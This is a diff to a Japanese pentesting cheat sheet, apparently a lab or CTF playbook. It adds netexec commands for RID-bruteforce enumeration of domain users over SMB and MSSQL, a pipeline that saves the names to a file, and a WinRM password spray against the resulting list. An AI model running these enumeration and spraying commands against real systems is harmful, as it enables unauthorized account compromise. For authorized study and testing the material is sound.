@@ -101,6 +101,58 @@ nxc smb [IP] -u [USER] -p '[PASSWORD]' --shares
 
 ---
 
+### RID bruteforce によるドメインユーザー列挙
+
+**何をしているのか：** Windows はユーザー・グループを SID（Security Identifier）で管理しており、SID の末尾の数字部分を **RID（Relative Identifier）** という。`--rid-brute` は RID を 500 から順に総当たりして、存在するすべてのユーザー・グループ名を取得する。通常の LDAP/RPC 列挙と同様の結果が得られるが、MSSQL や SMB 等の異なるプロトコルからも実行できる。
+
+```bash
+# [Kali] SMB 経由（最も一般的）
+nxc smb [IP] -u [USER] -p '[PASSWORD]' --rid-brute
+
+# [Kali] MSSQL 経由（SQL認証ユーザーで接続した場合でも有効）
+nxc mssql [IP] -u [USER] -p '[PASSWORD]' --local-auth --rid-brute
+
+# ユーザー名だけを抽出してファイルに保存するパイプライン
+# （ドメイン名\FirstName.LastName 形式のユーザーのみを抽出する）
+nxc mssql [IP] -u [USER] -p '[PASSWORD]' --local-auth --rid-brute \
+  | grep -oP '[DOMAIN]\\\\\w+\.\w+' \
+  | cut -d '\' -f2 \
+  | tee users
+```
+
+**パイプラインの各部の意味：**
+
+| 部分 | 意味 |
+|------|------|
+| `grep -oP 'DOMAIN\\\w+\.\w+'` | 正規表現で `DOMAIN\FirstName.LastName` 形式の文字列のみを抽出。ドメイン名は実際のものに置き換える |
+| `cut -d '\' -f2` | バックスラッシュで分割し、2番目の部分（ユーザー名）だけを取り出す |
+| `tee users` | 標準出力に表示しながらファイルにも保存（後続のパスワードスプレーで使う） |
+
+**出力例：**
+
+```
+jamie.dunn
+jane.smith
+alice.jones
+adam.scott
+```
+
+**着眼点 — 取得後にすること：**
+
+ユーザーリストができたら次は**パスワードスプレー**に進む。よくある初期パスワード（組織名+数字・季節+年等）や、すでに取得済みのパスワードを全ユーザーに試す。
+
+```bash
+# [Kali] 取得したユーザーリストで WinRM へのパスワードスプレー
+nxc winrm [IP] -u users -p '[PASSWORD]' --continue-on-success
+# [+] ... (Pwn3d!) が出たユーザーが WinRM 接続可能
+```
+
+**刺さらなかったとき：**
+- `--rid-brute` で `ACCESS_DENIED` になる → 権限が不足しているか、RPC/Windows セキュリティへのアクセスが制限されている。impacket-lookupsid を試す（`../02_Initial_Access/Protocol_Exploitation.md` RPC セクション参照）
+- ドメイン名が不明で grep にマッチしない → まず `nxc smb [IP] -u [USER] -p '[PASSWORD]'` の出力でドメイン名を確認する
+
+---
+
 ## 注意点・落とし穴
 
 - CrackMapExec（`cme`）と netexec（`nxc`）は構文がほぼ同じだが、オプション名が一部変わっている場合がある
@@ -111,4 +163,6 @@ nxc smb [IP] -u [USER] -p '[PASSWORD]' --shares
 
 ## 関連技術
 - 前：認証情報の発見 → `../02_Initial_Access/Credential_Discovery.md`
+- 前：MSSQL 経由の認証情報・ユーザー取得 → `../02_Initial_Access/MSSQL_Exploitation.md`
+- 後：WinRM シェル取得 → `../02_Initial_Access/Protocol_Exploitation.md`（WinRMセクション）
 - 後：取得した認証情報でのAD攻略 → `../00_Playbook/Windows_AD_Attack_Flow.md`
